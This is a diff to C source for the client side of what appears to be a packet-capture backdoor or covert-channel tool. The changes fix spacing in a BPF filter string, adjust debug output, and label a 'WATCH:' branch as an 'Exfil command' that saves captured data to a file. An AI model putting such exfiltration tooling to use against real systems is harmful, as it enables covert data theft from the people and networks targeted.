@@ -228,16 +228,16 @@ void client(struct client_opt c_opt){
     strcat(filter_exp, c_opt.target_host);
     
     sprintf(port_string, "%d", c_opt.target_port);
-    strcat(filter_exp, "and src port ");
+    strcat(filter_exp, " and src port ");
     strcat(filter_exp, port_string);
     
-    strcat(filter_exp, "and dst host ");
+    strcat(filter_exp, " and dst host ");
     strcat(filter_exp, c_opt.source_host);
     
     sprintf(port_string, "%d", c_opt.source_port);
-    strcat(filter_exp, "and dst port ");
+    strcat(filter_exp, " and dst port ");
     strcat(filter_exp, port_string);
-    strcat(filter_exp, "and ");
+    strcat(filter_exp, " and ");
     
     char protocol_name[16] = {0};
     if(c_opt.protocol == 1)
@@ -245,8 +245,6 @@ void client(struct client_opt c_opt){
     else
         strcpy(protocol_name, "tcp");
     strcat(filter_exp, protocol_name);
-    
-    printf("Client Filter: %s\n", filter_exp);
     
     // Compile filter
     if(pcap_compile(client_handle, &fp, filter_exp, 0, net) == -1){
@@ -273,8 +271,9 @@ void client(struct client_opt c_opt){
 
     /* Transmitted data */
 
-    printf("Total Buffer: %d bytes\n%.*s\n", msg_buf.position, msg_buf.position, msg_buf.buffer);
-
+    printf("\n--------------------\nTotal Buffer: %d bytes\n%.*s\n", msg_buf.position, msg_buf.position, msg_buf.buffer);
+    
+    // Exfil command
     if(strncmp(c_opt.command,"WATCH:",6) == 0){
         char file_name[1024] = {0};
 
@@ -309,9 +308,10 @@ void client(struct client_opt c_opt){
         fp = fopen(file_path, "w");
         fwrite(msg_buf.buffer, 1, sizeof(msg_buf.buffer), fp);
         fclose(fp);
+        printf("Output written to file: %s\n", file_path);
     }
     else{
-        printf("Total Buffer: %d bytes\n%.*s\n", msg_buf.position, msg_buf.position, msg_buf.buffer);
+        // Normal command
     }
 }
 
@@ -610,7 +610,7 @@ void client_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
 
     struct message_buffer *msg_buf_ptr = (struct message_buffer *)args;
 
-    printf("\nGot packet...\n");
+    printf("\n--------------------\nGot packet...\n");
 
     /* Parse packet */
 
